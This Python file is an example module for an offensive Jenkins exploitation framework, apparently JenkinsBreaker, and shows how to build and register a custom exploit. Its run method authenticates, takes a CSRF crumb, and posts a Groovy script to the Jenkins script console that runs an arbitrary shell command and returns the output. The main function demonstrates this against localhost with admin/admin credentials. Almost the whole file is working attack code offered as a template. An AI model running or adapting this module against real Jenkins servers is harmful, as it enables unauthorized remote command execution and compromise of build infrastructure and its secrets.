#!/usr/bin/env python3
"""
Custom Exploit Module Example

Demonstrates:
- Creating a custom exploit module
- Implementing the ExploitModule interface
- Registering with exploit_registry
- Using the custom module in exploits
"""

import sys
from pathlib import Path
from typing import Any, Dict
from dataclasses import dataclass

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from exploits import ExploitInterface, ExploitMetadata, ExploitResult


# Use ExploitInterface instead of ExploitModule
ExploitModule = ExploitInterface


class CustomJenkinsExploit(ExploitModule):
    """
    Custom exploit module example.
    
    This demonstrates how to create a custom Jenkins exploitation module
    that follows the JenkinsBreaker framework standards.
    """
    
    CVE_ID = "CUSTOM-2024-EXAMPLE"
    
    METADATA = ExploitMetadata(
        cve_id="CUSTOM-2024-EXAMPLE",
        name="Custom Jenkins Exploit Example",
        description="Demonstrates custom exploit module creation",
        affected_versions=["All versions"],
        mitre_attack=["T1190", "T1059.006"],
        severity="high",
        references=[
            "https://github.com/ridpath/JenkinsBreaker/examples",
        ],
        requires_auth=True,
        requires_crumb=True,
    )
    
    def check_vulnerable(self, session: Any, **kwargs: Any) -> bool:
        """
        Check if target is vulnerable.
        
        This is called before exploitation to verify the target is exploitable.
        """
        try:
            # Example: Check Jenkins version
            version = getattr(session, 'version', None)
            if not version:
                return False
            
            # Check for specific vulnerable version (example)
            # In real exploit: parse version and check against vulnerable ranges
            print(f"[*] Target Jenkins version: {version}")
            return True
            
        except Exception as e:
            print(f"[-] Vulnerability check failed: {e}")
            return False
    
    def run(self, session: Any, **kwargs: Any) -> ExploitResult:
        """
        Execute the exploit.
        
        Args:
            session: JenkinsSession object
            **kwargs: Exploit-specific parameters
        
        Returns:
            ExploitResult with status, details, and data
        """
        try:
            # Extract parameters
            command = kwargs.get("command", "whoami")
            target_path = kwargs.get("target_path", "/tmp")
            
            print(f"[*] Executing custom exploit")
            print(f"[*] Command: {command}")
            print(f"[*] Target path: {target_path}")
            
            # Step 1: Verify authentication
            if not hasattr(session, 'session') or not session.session:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="error",
                    details="Session not authenticated",
                    error="No valid session"
                )
            
            # Step 2: Get CSRF crumb (if required)
            crumb = None
            if self.METADATA.requires_crumb:
                try:
                    crumb_url = f"{session.base_url}/crumbIssuer/api/json"
                    crumb_response = session.session.get(crumb_url)
                    if crumb_response.status_code == 200:
                        crumb_data = crumb_response.json()
                        crumb = {
                            crumb_data['crumbRequestField']: crumb_data['crumb']
                        }
                        print(f"[+] CSRF crumb obtained")
                except Exception as e:
                    print(f"[-] Failed to get CSRF crumb: {e}")
            
            # Step 3: Execute exploit payload
            # This is where your actual exploit logic goes
            # Example: Execute Groovy script via Script Console
            
            groovy_script = f"""
            def command = "{command}"
            def proc = command.execute()
            proc.waitFor()
            def output = proc.text
            return output
            """
            
            script_url = f"{session.base_url}/scriptText"
            headers = crumb if crumb else {}
            
            response = session.session.post(
                script_url,
                data={"script": groovy_script},
                headers=headers,
                timeout=30
            )
            
            if response.status_code == 200:
                output = response.text
                print(f"[+] Exploit successful")
                print(f"[+] Output: {output[:200]}")
                
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="success",
                    details=f"Command executed successfully: {command}",
                    data={
                        "command": command,
                        "output": output,
                        "target_path": target_path
                    }
                )
            else:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="error",
                    details=f"Script execution failed: HTTP {response.status_code}",
                    error=response.text
                )
        
        except Exception as e:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="error",
                details=f"Exploitation failed: {str(e)}",
                error=str(e)
            )
    
    def cleanup(self, session: Any, **kwargs: Any) -> bool:
        """
        Cleanup after exploitation (optional).
        
        Remove artifacts, restore configuration, etc.
        """
        try:
            print("[*] Cleaning up...")
            # Example: Remove uploaded files, restore configs, etc.
            return True
        except Exception as e:
            print(f"[-] Cleanup failed: {e}")
            return False


def main():
    """Demonstrate custom exploit module usage."""
    from exploits import ExploitRegistry
    import requests
    
    # Create registry
    exploit_registry = ExploitRegistry()
    
    # Define JenkinsSession
    class JenkinsSession:
        """Minimal Jenkins session for exploitation."""
        def __init__(self, target_url, username=None, password=None, verify_ssl=False):
            self.base_url = target_url.rstrip('/')
            self.session = requests.Session()
            self.session.verify = verify_ssl
            self.version = "Unknown"
            
            # Authenticate if credentials provided
            if username and password:
                login_url = f"{self.base_url}/j_security_check"
                self.session.post(login_url, data={
                    'j_username': username,
                    'j_password': password
                })
            
            # Get version
            try:
                response = self.session.get(f"{self.base_url}/api/json")
                if response.status_code == 200:
                    data = response.json()
                    self.version = data.get('version', 'Unknown')
            except:
                pass
    
    print("[*] Custom Exploit Module Example")
    print()
    
    # Step 1: Load existing exploit modules
    print("[*] Step 1: Loading existing exploit modules...")
    exploit_registry.load_all_modules()
    print()
    
    # Step 2: Create custom exploit instance
    print("[*] Step 2: Creating custom exploit module...")
    custom_exploit = CustomJenkinsExploit()
    print(f"[+] Created: {custom_exploit.CVE_ID}")
    print(f"[+] Name: {custom_exploit.METADATA.name}")
    print(f"[+] Severity: {custom_exploit.METADATA.severity}")
    print()
    
    # Step 3: Create Jenkins session
    print("[*] Step 3: Creating Jenkins session...")
    target_url = "http://localhost:8080"
    username = "admin"
    password = "admin"
    
    try:
        session = JenkinsSession(
            target_url=target_url,
            username=username,
            password=password,
            verify_ssl=False
        )
        print(f"[+] Session created (Jenkins {session.version})")
        print()
    except Exception as e:
        print(f"[-] Session creation failed: {e}")
        return 1
    
    # Step 4: Check vulnerability
    print("[*] Step 4: Checking if target is vulnerable...")
    
    # Create tool wrapper for exploit execution
    class ToolWrapper:
        def __init__(self, session):
            self.session = session
            self.base_url = session.base_url
    
    tool = ToolWrapper(session)
    
    if custom_exploit.check_vulnerable(tool):
        print("[+] Target appears vulnerable")
        print()
    else:
        print("[-] Target not vulnerable")
        return 1
    
    # Step 5: Execute exploit
    print("[*] Step 5: Executing custom exploit...")
    result = custom_exploit.run(
        session=tool,
        command="id",
        target_path="/tmp"
    )
    
    print()
    print("="*60)
    print("Exploit Result:")
    print("="*60)
    print(f"Status: {result.status}")
    print(f"Details: {result.details}")
    if result.data:
        print(f"Data:")
        for key, value in result.data.items():
            print(f"  {key}: {value}")
    if result.error:
        print(f"Error: {result.error}")
    print("="*60)
    print()
    
    # Step 6: Cleanup
    print("[*] Step 6: Cleaning up...")
    custom_exploit.cleanup(tool)
    print()
    
    print("[+] Custom exploit module example complete")
    print()
    print("To create your own module:")
    print("  1. Inherit from ExploitModule")
    print("  2. Define CVE_ID and METADATA")
    print("  3. Implement run() method")
    print("  4. Optionally implement check_vulnerable() and cleanup()")
    print("  5. Place in exploits/ directory for auto-discovery")
    print()
    
    return 0


if __name__ == "__main__":
    sys.exit(main())
